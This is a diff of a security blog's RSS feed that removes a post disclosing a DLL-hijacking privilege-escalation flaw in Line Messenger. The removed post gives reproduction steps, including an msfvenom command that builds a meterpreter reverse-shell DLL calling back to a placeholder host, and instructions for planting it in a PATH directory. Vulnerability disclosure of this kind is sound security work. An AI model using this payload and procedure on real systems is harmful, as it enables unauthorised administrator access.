@@ -5,54 +5,8 @@
         <description>Recent content in Posts on VAPT.IO - Home of the Next Gen Cyber Ninja</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 31 Dec 2019 22:31:29 +0530</lastBuildDate>
+        <lastBuildDate>Sun, 26 Aug 2018 16:53:00 +0530</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
-        
-        <item>
-            <title>Line Messenger Escalation of Privilege Vulnerability</title>
-            <link>/posts/2019/12/line-messenger-escalation-of-privilege-vulnerability/</link>
-            <pubDate>Tue, 31 Dec 2019 22:31:29 +0530</pubDate>
-            
-            <guid>/posts/2019/12/line-messenger-escalation-of-privilege-vulnerability/</guid>
-            <description>Vulnerability Detail Line Ver 5.20.2.2045 when executed, searches for a missing (dxtn.dll) file, which forces the Safe DLL search order to move to directories defined in the PATH variable. A low privileged attacker having write access to any of the directories defined in the PATH variable can put a malicious file (Metasploit Backdoor) with the name dxtn.dll forcing the search order to complete and Escalate privileges when an administrator executes Line.</description>
-            <content type="html"><![CDATA[
-
-<h2 id="vulnerability-detail">Vulnerability Detail</h2>
-
-<p>Line Ver 5.20.2.2045 when executed, searches for a missing (<code>dxtn.dll</code>) file, which forces the Safe DLL search order to move to directories defined in the <code>PATH</code> variable. A low privileged attacker having write access to any of the directories defined in the <code>PATH</code> variable can put a malicious file (Metasploit Backdoor) with the name <code>dxtn.dll</code> forcing the search order to complete and Escalate privileges when an administrator executes Line.</p>
-
-<p><em><strong>Note</strong>: The root cause of this vulnerability is the missing DLL File which can cause attacks like EOP (Escalation of Privleges), DLL Hijacking and may also allow Persistence (Persistent Access for the Attacker)</em></p>
-
-<p><strong>Steps To Reproduce</strong>:</p>
-
-<ol>
-<li><p>Install Line on both Admin and Non-Admin User</p></li>
-
-<li><p>Logon to Non-Admin User</p></li>
-
-<li><p>You can create a malicious file with the name dxtn.dll using msfvenom with the following command:
-<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT –encrypt aes256 –encrypt-key YOUR_PASSWORD -f dll &gt; dxtn.dll</code></p></li>
-
-<li><p>Start a Listener on your defined IP and port for the DLL backdoor</p></li>
-
-<li><p>Copy the malicious dxtn.dll file to any directory defined in the PATH variable</p></li>
-
-<li><p>Logout and Login as Administrator</p></li>
-
-<li><p>Execute LINE Messenger</p></li>
-
-<li><p>Metasploit Should Receive an administrator Shell of the target system</p></li>
-</ol>
-
-<h2 id="supporting-material-references">Supporting Material/References:</h2>
-
-<p>After Installing Line on a Normal (Non-Admin) User Account, When Line is Executed, It loads numerous DLL files mostly from the <code>C:\Users\lowpriv\AppData\Local\LINE\bin</code> directory and other DLL Safe Search Paths such as <code>SysWoW64</code>, <code>System32</code>, <code>WinSxS</code> and <code>Windows\System32\DriverStore\FileRepository\nvlti.inf_amd64_fddd8f6e89d0291c</code> Directories.</p>
-
-<p>However, while trying to load <code>dxtn.dll</code> file, The search fails on system directories due to the fact that the file doesn’t exist and is forced to check directories listed in the <code>PATH</code> system variable.</p>
-
-<p>Since <code>BUILTIN\Users</code> (Normal Users) can write to most of the paths defined in the <code>PATH</code> variable, A Malicious DLL file (renamed to <code>dxtn.dll</code>) placed at any of these paths will eventually complete the search order causing <code>Line.exe</code> to load the malicious DLL file. This situation will cause an attacker gaining access in the context of the user. However, since the malicious DLL file now exists for both the admin and non-admin users (Since it&rsquo;s not in the AppData Directory), An administrator trying to execute Line will trigger the malicious file and will eventually allow attackers to gain access to the system.</p>
-]]></content>
-        </item>
         
         <item>
             <title>Subjects that Help Building Cyber Security Skills while you are Studying</title>
